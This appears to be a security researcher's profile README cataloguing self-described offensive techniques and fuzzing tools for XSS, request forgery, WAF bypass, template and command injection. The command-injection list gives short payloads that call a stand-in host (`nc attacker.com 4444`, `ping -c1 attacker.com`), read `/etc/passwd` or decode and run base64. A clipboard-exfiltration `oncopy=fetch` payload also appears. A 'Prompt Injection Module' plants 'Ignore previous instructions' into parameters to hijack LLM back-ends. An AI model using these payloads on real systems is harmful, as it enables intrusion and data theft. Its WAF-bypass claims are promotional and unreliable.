# 👋 Hi, I’m Haroon Ahmad Awan

I’m an advanced cybersecurity expert specializing in inventing new, never-seen-before techniques in cyber and information security.
My notable public works are listed below. Private techniques/tools, still actively used in top-tier industries are not publicly available.


---

## 🧠 Notable Public Release Works (Original & Unprecedented)
> Limited Public Releases

### 💻 Converting Phone numbers into Payloads
- **Many systems allowed incorporating phone numbers**  
 Hijacking websites, applications, and systems by generating exclusive payloads during phone number and cell phone scan, designed to covertly bypass advanced firewalls and enable full takeover or control or popup XSS or Commands.

### 💻 Window Null Session Hijacking
- **Null Session Hijacking using Escalations**  
  Hijacking user machines through any pipelines and registry manipulation over a network or the internet.

### 💻 User Computer Hijacking
- **MIRC DNS Resolver Bug Exploitation**  
  Hijacking user machines via malformed DNS response chaining.

### 🧬 Created Next-Gen Cross Site Scripting (XSS) Techniques

- WebGPU / WebXR / WebTransport API fuzzing  
- Service-Worker cache poisoning vectors  
- `instantiateStreaming()` WebAssembly injection  
- `MutationObserver` race-condition exploitation  
- Cross-protocol chains (`file://` ↔ `http/https://` ↔ `ws://`)  
- Adaptive Header Morphing / `--polymorph` WAF-bypass engine  
- JSON-LD / RDFa / Microdata injection  
- GraphQL schema autodiscovery & variable fuzzing  
- Prototype-pollution–assisted DOM clobbering  
- Unicode RLO & BOM disguise encodings  

---

### 🧬 Created Next-Gen Request Forgery Techniques

#### 🔁 Meta-Application Request Smuggling Forgery
> Chains backend service calls by smuggling attacker-controlled params through one service into another. Bypasses access controls enforced only at the frontend.

#### 🌀 RARF – Request Alias Resolution Forgery
> Uses DNS rebinding & CNAME tricks to resolve attacker domains into internal hostnames (`*.svc.cluster.local`).

#### 🔓 VREF – Virtual Reference Elevation Forgery
> Access/mutate objects via fuzzed or guessed UUIDs, hashes, or opaque references belonging to other users or admins.

#### 📩 SREF – Stored Request Execution Forgery
> Injects POST/PUT payloads in drafts/configs/webhooks that auto-execute later via background jobs or CRON tasks.

#### 🪞 CLRF – CORS Logic Rebinding Forgery
> Exploits wildcard/weak CORS settings to trigger credential reflection or data leaks from attacker-controlled origins.

#### 🔊 EPRF – Event Propagation Request Forgery
> Injects commands using browser APIs (`postMessage`, `BroadcastChannel`, `SharedWorker`) into trusted app contexts.

#### 🧬 IMRF – Interface Mutation Request Forgery
> Mutates DOM—hidden inputs, CSRF tokens, form actions—via Shadow DOM or inline scripts, auto-submitting forms stealthily.

#### 🔗 UDRF – Universal Dependency Relay Forgery
> Abuses SDKs/backends (e.g., S3 relays, gRPC proxies) to relay malicious input to internal services or file systems.

---

### 🧬 Created Next-Gen WAF Bypass Techniques
> ⚡ 96 WAF Filter Sets Never Seen Before - Rebrands and transforms your current static payloads into Thunder Striker XSS variants, blasting through any WAF in seconds.

### 🧬 Created Next-Gen Port Scan – NG-Firewalk-PortScan Arsenal
### ICMP with DNS  
> Embeds DNS queries inside ICMP packets to evade traditional protocol filtering.

### ICMP with HTTP  
> Transmits full HTTP GET requests over ICMP echo payloads for cross-protocol evasion.

### ICMP Echo with Random Data  
> Uses randomized binary/text payloads to fingerprint ICMP response behavior.

### TCP SYN-ACK with HTTP  
> Abuses invalid TCP handshake state (SYN-ACK) to deliver HTTP payloads.

### TCP ACK with DNS  
> Carries DNS queries in TCP ACK packets, confusing firewall session validation.

### TCP FIN with DNS  
> Utilizes TCP FIN flag with embedded DNS query to trick DPI state engines.

### TCP PSH with DNS  
> Combines TCP PUSH flag with DNS payloads to evade stream inspection.

### UDP with HTTP  
> Sends HTTP headers over UDP to detect misconfigured services or log parsers.

### UDP with ICMP Payload  
> Injects ICMP messages inside UDP frames — a hybrid spoofing method.

### AI/ML Firewall Bypass  
> Dynamically morphs headers (e.g., User-Agent) using machine learning to evade rule-based filtering.

### Adaptive Timing Scan (AI‑Driven)  
> Adjusts packet intervals mid-scan based on live feedback or ML model guidance.

### Mixed Protocol Scan  
> Alternates between TCP, UDP, and ICMP during the same scan cycle.

### Randomized Payload Scan  
> Sends polymorphic/random payloads to defeat signature-based firewalls.

### Custom Tool Injection per Port  
> Automatically executes tools like Nmap with `{target}` and `{port}` placeholder rewriting.

### Exact Device + Firewall Signature Matching  
> Identifies precise devices using layered detection: TCP flags, TTL, ICMP type, TCP options, and more.

### AI-Based Adaptive Scan Switching  
> Dynamically changes scanning techniques based on AI model feedback.

### False Positive Detection (ML-Powered)  
> Filters noisy/inaccurate results using a trained false-positive classifier.

### Weighted Scoring for Hardening Quality  
> Assigns scores to firewall, segmentation, and IDS presence based on behavioral output.

### Built-in DPI Simulation Layer  
> Detects and flags:
> - MITM Attempts  
> - Session Hijacking  
> - Fragmentation Attacks  
> - SYN Flood Behavior  
> - DNS / ARP / IP Spoofing  
> - Malformed Packet Responses


---

### 🧬 Created Next-Gen PHP Fuzzing Techniques

### 🛰️ HTTP/3 (QUIC) Header Fuzzing + HTTP/2 Chunk Desync
- Sends malformed HTTP/3 (QUIC) pseudo-headers and misaligned frames
- Includes raw socket-based **HTTP/2 Transfer-Encoding confusion**
- Simulates CDN/WAF vs origin server parsing mismatch

### 🧬 Shadow DOM XSS Auto-Fuzzing
- Automatically detects and injects into **Shadow DOM, `<template>`, and `<slot>` contexts**
- Fully integrated with Playwright to bypass standard DOM traversal

### 🔁 DOM MutationObserver-Based Trigger Detection
- Fuzzes targets that rely on dynamic JavaScript DOM updates
- Uses MutationObservers to automatically trigger payloads in dynamic UIs
- Auto tune per or post

### 📋 Clipboard Hijack via `oncopy=fetch(...)`
- Injects HTML payloads that exfiltrate clipboard data or trigger fetch/XSS on copy

### ⚔️ WebSocket Protocol XSS Injection
- Establishes real-time WebSocket connections
- Injects and validates payloads over socket messages, not HTTP

### ⏱️ Async/Await XSS Race Exploits
- Injects `async/await`-based payloads with delayed eval()
- Bypasses content security filters triggered on immediate `eval` usage


---

### 🧬 Created Next-Gen Multi-STI (Server Template Injections) Fuzzing Techniques

### 🧬 BSTI (Bytecode-Level Template Injection)
> Manipulates the template engine’s compiled bytecode cache (`.pyc`/memory) to alter execution paths.  

### 🧬 MSTI (Macro-Level Template Injection)
> Shadows or poisons macros and partials by redefining them or injecting malicious imports.  

### 🧬 ASTI (AST-Level Template Injection)
>  Hijacks the in-memory Abstract Syntax Tree or transformer pipeline during compilation.  

### 🧬 FSTI (Filter-Pipeline Template Injection)
> Abuses filter resolution, fallback logic, or custom chainable filters to escalate code execution.  

### 🧬 GSTI (Global Context Template Injection)
> Poisons global scope, pre-render hooks, or built-ins not covered by traditional SSTI.  

### 🧬 VSTI (View-Level Template Injection)
> Injects payloads via unsafe user-controlled template names or view lookup resolution.  

---

### 🧬 Created Next-Gen Multi-Command Injection Fuzzing Techniques
> While commix and others generate payloads for inject specific flag while my variants especially ICFI category is the fully automated, massively obfuscated, structure-aware, AI-assisted evolutions.
    - **XCI – eXtended Command Injection**  
      Injects inside CLI flags or redirection chains (e.g. `--file=/tmp/$(id)`)  
    - **RICI – Recursive Injection Command Invocation**  
      Double-wrapped/evaluated payloads (e.g. `$(echo $(echo Y2F0IC9...|base64 -d) | sh)`)  
    - **EFCI – Environmental Function Chain Injection**  
      Leverages env vars & eval (e.g. `VAR="curl http://dns"; eval $VAR`)  
    - **ICFI – Input-Controlled Flag Injection**  
      Fakes legitimate flags (e.g. `--user $(ping -c1 attacker.com)`)  
    - **HCI – Header-Controlled Injection**  
      Payloads in HTTP headers (e.g. `User-Agent: $(id)`)  
    - **CVCI – Chained Variable Command Injection**  
      Complex chaining with `&&`, `||`, backticks (e.g. `cmd1 || $(cmd2) && $(cmd3)`)  
    - **TPCI – Type-Punned Command Injection**  
      Misleads type parsers (e.g. injecting into integers: `123;uname -a`)  
    - **UDCI – Unicode-Disguised Command Injection**  
      Obfuscates via Unicode escapes or RTL overrides (e.g. `\u0024\u007B\u0069\u0064\u007D`)  
    - **PPCI – Polyglot Protocol Command Injection**  
      Cross-protocol payloads (e.g. `curl http://127.0.0.1;nc attacker.com 4444`)  
    - **FDI – File Descriptor Injection**  
      Uses FD redirection (e.g. `2>&1; cat /etc/passwd`)  
    - **QCI – Quoted Context Injection**  
      Breaks quoting contexts (e.g. `';uname -a;'`)  
    - **BPCI – Background Process Command Injection**  
      Conceals payloads in background jobs (e.g. `ping -c1 attacker.com &`)  
    - **MSCI – Multi-Stage Chained Injection**  
      Sequential decode & execute (e.g. `eval $(base64 -d <<< ZWNobyAiaWQi)`)  
    - **HSCI – Header-Script Command Injection**  
      Embeds scripts in HTML headers/tags (e.g. `<meta http-equiv="refresh" content="0;url='.../;id'" />`)  
    - **NSCI – Null-Space Command Injection**  
      Exploits IFS or null bytes (e.g. `$(IFS=' ';echo whoami)`, `%00id`)  


### 🧬 Created Next-Gen HTTP, Layers and Protocols Fuzzing Techniques
- **HTTP/2 Smuggling**  
  Experimental “CL→TE” and “TE→CL” variants over HTTP/2 to bypass front-end/back-end checks.

- **HTTP Trailer Injection**  
  Abuse of chunked-transfer trailers (e.g. `0\r\nFlavor: CHEESE\r\n\r\n`) to smuggle headers.

- **WebSocket Hijack & Fuzzing**  
  In-page override of `window.WebSocket` → auto-discover WS endpoints → ping/pong exchange.

- **SSE Trap & Injection**  
  Hooking `EventSource` in the browser → auto-capture first `data:` event for injection feedback.

- **Service Worker Abuse Detection**  
  Scans `/sw.js` for vulnerable `importScripts()` calls and other SW logic flaws.

- **AI-Driven XSS Mutation**  
  AI-powered on-the-fly mutation of `<script>alert()</script>` into novel bypass variants.

- **Prompt Injection Module**  
  Embeds “Ignore previous instructions…” payloads into form/JSON params to hijack LLM back-ends.

- **GraphQL Mutation Probing**  
  Blind mutation tests (e.g. `mutation { __typename }`) in addition to standard `__schema` introspection.

- **WASM Parser Fuzzing**  
  Sends minimal, malformed WebAssembly binaries to uncover parser or runtime parsing errors.  


### 🧬 Created Next-Gen Multi-Command Cross Site Fuzzing Techniques
> `wtXSS` → WebTransport param injection  
> `wsXSS` → WASM binary injection fuzzing  
> `shXSS` → Shadow DOM input reflection  
> `swXSS` → `ServiceWorker` hijack injection  
> `pxXSS` → `postMessage` channel injection  
> `dpXSS` → DOMPoly mutation-based XSS  
> `vxXSS` → Vector-morphing dual-part payload  
> `rloXSS` → Right-to-Left Override injection (filename trick)  
> `homXSS` → Unicode homoglyph-based spoofing (Cyrillic/Latin lookalikes)  
> `ceoXSS` → Cross-Execution Origin vector  
> `clXSS` → Cross-layered tag injection across multiple DOM levels  
> `cdXSS` → Cross-document XSS via frame/iframe injection  
> `fdXSS` → FormData `multipart/form-data` reflection fuzz  
> `cmXSS` → Cross-MIME payload injection for XSS via `.gif/.txt`

### 🧬 Created Next-Gen Tools
- Bandasbahen - A browser-oriented fuzzing engine designed to uncover 0-day vulnerabilities, including exploit paths similar to those used by Pegasus but you can also uncover exact paths using this script.
- Noctua - A GPU-accelerated, AI-powered payload injector that renders and analyzes content in real time to discover cross-site scripting and rendering-based flaws across modern apps, APIs, and endpoints.
- XSSInspector - It includes 96 advanced filter sets to uncover vulnerabilities often missed by human analysts and bypass over 95% of modern WAFs with precision.
- PortScan - When tools like Nmap fail against firewalls like Palo Alto or Checkpoint, this next-generation port scanner uses advanced firewalk techniques to bypass defenses and validate open ports. It also suggests injection strategies for each detected service.
- PHP_FUZZER - JS and PHP AI powered fuzzer to uncover many issues
- MultiSTI - AI-Powered Multi-STI Turbo Charged Fuzzer for 0 Day Discovery in Modern Dynamic Web/Endpoint/Apps
- MultiServerSide - AI-Powered Multi Request Forgeries Fuzzer for 0-Day Discovery in Modern Dynamic Web/Endpoint/Apps
- Multi CMDi - AI‑Powered Command Injection Fuzzer for 0 Day Discovery in Modern Dynamic Web/Endpoint/Apps
- lynx - AI-Powered new breed of Cross Site Hacks including XSS, etc

---

### 🧬 Third Party Packages of the Tool Next-Gen Tools
> XSSInspector - Available via apt search xssinspector (Kali or Debian based linux third-party package).

---

📫 Connect or collaborate: [haroon@cyberzeus.pk](mailto:haroon@cyberzeus.pk)

---



